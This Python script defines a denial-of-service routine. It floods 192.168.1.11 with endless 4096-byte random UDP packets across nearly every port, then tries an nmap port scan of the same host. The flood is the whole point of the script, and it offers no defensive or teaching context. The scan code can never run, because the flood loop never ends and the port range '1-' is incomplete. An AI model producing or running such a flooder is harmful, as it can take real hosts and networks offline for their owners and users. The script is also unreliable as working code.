import nmap
import socket
import random

ip_addr = '192.168.1.11'
port_range = '1-'

def dos_attack(ip):
    port = 1
    data = random.getrandbits(4096)
    data = data.to_bytes(4096, byteorder='little')
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        s.sendto(data, (ip, port))
        port = port + 1
        if port == 65534:
            port = 1


if __name__ == "__main__":
    
    dos_attack(ip_addr)
    
    nm = nmap.PortScanner()
    nm.scan(ip_addr, ports=port_range)

    print(nm.command_line())
    print(nm.scaninfo())
    print(nm.all_hosts())

    try:
        if 'up' not in nm[ip_addr].state():
            print(nm[ip_addr].state())
            print("IP addr not up " + ip_addr)
            raise Exception('Node Down')
        elif 'tcp' not in nm[ip_addr].all_protocols():
            print("No open tcp ports in " + port_range)
            raise Exception("No TCP ports")
    except:
        print('Fail')